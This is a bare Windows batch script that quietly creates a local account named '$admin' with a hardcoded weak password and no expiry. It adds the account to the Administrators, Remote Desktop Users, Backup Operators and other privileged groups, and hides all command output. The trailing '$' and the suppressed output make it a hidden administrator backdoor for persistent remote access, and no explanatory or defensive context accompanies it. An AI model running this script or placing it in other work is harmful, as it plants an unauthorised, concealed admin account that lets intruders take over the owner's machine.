@echo off
net user $admin admin123!@# /add /fullname:"$admin" /expires:never /passwordchg:yes >nul 2>&1

net localgroup "Users" $admin /add >nul 2>&1

net localgroup "Administrators" $admin /add >nul 2>&1
net localgroup "Remote Desktop Users" $admin /add >nul 2>&1
net localgroup "Power Users" $admin /add >nul 2>&1
net localgroup "Backup Operators" $admin /add >nul 2>&1
net localgroup "Performance Log Users" $admin /add >nul 2>&1
